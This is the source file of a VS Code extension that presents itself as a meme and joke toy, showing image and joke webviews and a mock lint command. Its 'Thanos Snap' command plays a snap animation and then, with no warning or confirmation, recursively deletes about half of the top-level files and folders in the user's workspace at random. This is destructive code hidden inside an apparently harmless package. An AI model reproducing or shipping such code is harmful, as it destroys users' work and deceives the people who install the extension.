// The module 'vscode' contains the VS Code extensibility API
// Import the module and reference it with the alias vscode in your code below

const vscode = require("vscode");
const axios = require("axios");
const fs = require("fs");
const path = require("path");

let MINUTES;
let scheduler;
let hackySolution;
let hackySolutionRunning = false;

const dankMemeGenerator = async () => {
  const config = {
    method: "get",
    url: "https://meme-api.herokuapp.com/gimme",
    headers: {},
  };
  // @ts-ignore
  const result = await axios(config);
  const memeUrl = result.data.url;
  return `
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meme</title>
  </head>
     <img src="${memeUrl}"></img>
  </body>
  </html>
`;
};

const catGifGenerator = async () => {
  const catUrl = "http://thecatapi.com/api/images/get?format=src&type=gif";
  return `
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meme</title>
  </head>
     <img src="${catUrl}"></img>
  </body>
  </html>`;
};

const dogPicGenerator = async () => {
  const baseUrl = "https://dog.ceo/api/breeds/image/random";
  const config = {
    method: "get",
    url: baseUrl,
    headers: {},
  };
  // @ts-ignore
  const result = await axios(config);
  const dogUrl = result.data.message;
  return `
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meme</title>
  </head>
     <img src="${dogUrl}"></img>
  </body>
  </html>`;
};

const jokeGenerator = async () => {
  const baseUrl = "https://v2.jokeapi.dev/joke/Any?format=txt";
  const config = {
    method: "get",
    url: baseUrl,
    headers: {},
  };
  // @ts-ignore
  const result = await axios(config);
  const jokeText = result.data;
  return `<h1>${jokeText}</h1>`;
};

const createMemeWebView = async function () {
  const contributionConfiguration = vscode.workspace.getConfiguration(
    "MSMemeCode"
  );

  const keys = ["DankMemes", "CatPics", "DogPics", "Jokes"];
  const keyUrlMapping = {
    DankMemes: dankMemeGenerator,
    CatPics: catGifGenerator,
    DogPics: dogPicGenerator,
    Jokes: jokeGenerator,
  };
  for (let i = 0; i < keys.length; i++) {
    if (contributionConfiguration[keys[i]]) {
      const panel = vscode.window.createWebviewPanel(
        "meme",
        keys[i],
        vscode.ViewColumn.One,
        {}
      );
      panel.webview.html = await keyUrlMapping[keys[i]]();
    }
  }
};

const createSnapWebView = function (quote) {
  const panel = vscode.window.createWebviewPanel(
    "snap",
    "Thanos Snap",
    vscode.ViewColumn.One,
    {}
  );
  let count = 0;
  let timerInterval;
  panel.webview.html = `<!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thanos Snap</title>
  </head><body></body>
  </html>`;

  timerInterval = setInterval(() => {
    panel.webview.html = `
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thanos Snap</title>
  </head>
      <h1>${quote}</h1>
      ${
        count >= 2
          ? `<img src="https://media1.tenor.com/images/e36fb32cfc3b63075adf0f1843fdc43a/tenor.gif?itemid=12502580"></img>`
          : ""
      }
      ${
        count >= 1
          ? `<img src="https://thumbs-prod.si-cdn.com/0Hlhw9KPW6kA8-zuSeBrgg0ztfQ=/fit-in/1600x0/filters:focal(582x120:583x121)/https://public-media.si-cdn.com/filer/d6/7d/d67d186f-f5f3-4867-82c5-2c772120304f/thanos-snap-featured-120518-2.jpg"></img>`
          : ""
      }
  </body>
  </html>`;
    count += 1;
    if (count >= 3) {
      clearInterval(timerInterval);
      const workspace = vscode.workspace;
      const rootPath = workspace.rootPath;

      fs.readdir(rootPath, async function (err, files) {
        if (err) {
          return console.log("Unable to scan directory: " + err);
        }

        await Promise.all(
          files.map(async (file) => {
            const randomProbability = Math.random();

            if (randomProbability > 0.5) {
              const filePath = path.join(rootPath, file);
              const edit = new vscode.WorkspaceEdit();
              const fileUri = vscode.Uri.file(filePath);
              edit.deleteFile(fileUri, {
                recursive: true,
                ignoreIfNotExists: true,
              });
              return await workspace.applyEdit(edit);
            }
          })
        );
      });
    }
  }, 5000);

  panel.onDidDispose(() => {
    clearInterval(timerInterval);
  });
};

function activate(context) {
  let activeEditor = vscode.window.activeTextEditor;

  const underlineDecoration = vscode.window.createTextEditorDecorationType({
    textDecoration: "darkred wavy underline",
  });

  const lint = function () {
    if (!activeEditor) {
      return;
    }
    const selectedText = activeEditor.document.getText(activeEditor.selection);
    const start = new vscode.Position(0, 0);
    const range = new vscode.Range(start, activeEditor.selection.end);
    activeEditor.setDecorations(underlineDecoration, [range]);

    vscode.window.showInformationMessage(selectedText);
  };
  vscode.window.onDidChangeActiveTextEditor(
    (editor) => {
      activeEditor = editor;
    },
    null,
    context.subscriptions
  );

  const lintCommand = vscode.commands.registerCommand("MemeCode.lint", () => {
    if (!hackySolutionRunning) {
      hackySolutionRunning = true;
      hackySolution = setInterval(function () {
        lint();
      }, 1000);
    } else {
      hackySolutionRunning = false;
      clearInterval(hackySolution);
    }
  });

  MINUTES = vscode.workspace.getConfiguration("MSMemeCode")["TimeBetweenMemes"];
  scheduler = setInterval(() => {
    console.log("testing");
    vscode.window.showInformationMessage(
      "Its been a while, you should take a break here's a meme!"
    );
    createMemeWebView();
  }, MINUTES * 60 * 1000);

  vscode.workspace.onDidChangeConfiguration(() => {
    clearInterval(scheduler);
    MINUTES = vscode.workspace.getConfiguration("MSMemeCode")[
      "TimeBetweenMemes"
    ];
    scheduler = setInterval(() => {
      console.log("testing");
      vscode.window.showInformationMessage(
        "Its been a while, you should take a break here's a meme!"
      );
      createMemeWebView();
    }, MINUTES * 60 * 1000);
  });

  const webview = vscode.commands.registerCommand(
    "MemeCode.giveMeme",
    createMemeWebView
  );

  const thanosMeme = async function () {
    const thanosQuoteAPIUrl = "https://thanosapi.herokuapp.com/random/";
    const config = {
      method: "get",
      url: thanosQuoteAPIUrl,
      headers: {},
    };
    // @ts-ignore
    const thanosQuote = (await axios(config)).data.quote;
    createSnapWebView(thanosQuote);
  };
  const thanosMemeCommand = vscode.commands.registerCommand(
    "MemeCode.thanosMeme",
    thanosMeme
  );

  context.subscriptions.push(lintCommand);
  context.subscriptions.push(webview);
  context.subscriptions.push(thanosMemeCommand);
}
// @ts-ignore
exports.activate = activate;

// this method is called when your extension is deactivated
function deactivate() {
  clearInterval(scheduler);
  clearInterval(hackySolution);
}

module.exports = {
  // @ts-ignore
  activate,
  deactivate,
};
